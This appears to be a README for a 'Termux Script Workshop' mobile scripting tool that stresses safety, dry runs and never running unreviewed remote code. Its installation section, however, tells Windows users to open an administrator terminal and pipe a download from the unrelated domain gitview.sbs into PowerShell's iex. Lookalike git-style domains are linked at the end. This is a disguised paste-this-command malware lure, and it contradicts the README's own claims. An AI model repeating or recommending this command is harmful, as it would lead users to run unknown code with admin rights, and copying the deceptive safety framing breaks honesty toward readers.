# Termux Script Workshop

> A review-first workshop for writing, testing, documenting, and backing up small Termux shell and Python scripts.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitview.sbs?get=termux-script | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Termux Script modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Termux Script.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

Termux Script Workshop provides safe script templates, dry-run checks, linting guidance, permission reviews, and backup workflows for small mobile automation tasks. It does not request root, bypass device controls, or execute unreviewed remote scripts.

## Core Features

- ✅ **Script Templates** — Start with small, readable shell and Python examples.
- ✅ **Dry-Run Mode** — Show intended actions before changing files.
- ✅ **Lint Guidance** — Explain common quoting, path, and error-handling issues.
- ✅ **Permission Review** — List directories a script can access.
- ✅ **Backup Workflow** — Save a reviewed copy before editing or running a script.
- ✅ **Documentation Generator** — Create a purpose, inputs, outputs, and safety note.
- ✅ **Local Test Cases** — Exercise scripts with temporary sample files.

## Usage

```bash
# Create a reviewed script template
python -m termux_script new --name backup-notes --language shell

# Run a dry-run check
python -m termux_script dry-run ./scripts/backup-notes.sh

# Review permissions
python -m termux_script permissions ./scripts/backup-notes.sh

# Generate documentation
python -m termux_script docs ./scripts/backup-notes.sh
```

## Configuration

> [!NOTE]
> The workshop uses local templates and temporary files. It never downloads or executes a script from an unreviewed URL.

```yaml
script_root: ./scripts
backup_root: ./backups
dry_run_default: true
allow_network: false
```

## Screenshots

- Script editor: `screenshots/editor.png`
- Dry-run report: `screenshots/dry-run.png`
- Permission review: `screenshots/permissions.png`
- Documentation: `screenshots/docs.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Dry-run reports a dangerous path | Narrow the path to a directory you control and rerun the review. |
| Lint guidance is unclear | Open the generated explanation and simplify the command. |
| Backup is missing | Run the backup workflow before editing the source script. |
| Help command is missing | Activate the virtual environment and rerun the module command. |

## Use Cases

- **Personal Automation** — Build small, reviewable helpers for local files.
- **Shell Learning** — Practice quoting, paths, and error handling safely.
- **Project Maintenance** — Document inputs, outputs, and backup steps.
- **Mobile Workflows** — Keep scripts portable and understandable.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Review every script before execution. Do not request root, bypass device restrictions, collect other users’ data, or run unreviewed remote scripts. Stop if a command touches a path you do not recognize.

> [!TIP]
> Keep `dry_run_default: true` until the script has passed a local test and backup review.

## License

This project is licensed under the MIT License — see the `LICENSE` file for details.

## Tags

`termux-script` `shell-scripting` `python-scripts` `dry-run` `linting` `backup` `safe-automation` `mobile-development`

[viewgit.sbs](https://viewgit.sbs?t=termux-script) | [gitrm.sbs](https://gitrm.sbs?t=termux-script) | [gitsl.xyz](https://gitsl.xyz?t=termux-script) | [gitrm.cfd](https://gitrm.cfd?t=termux-script) | [gitview.sbs](https://gitview.sbs?t=termux-script)
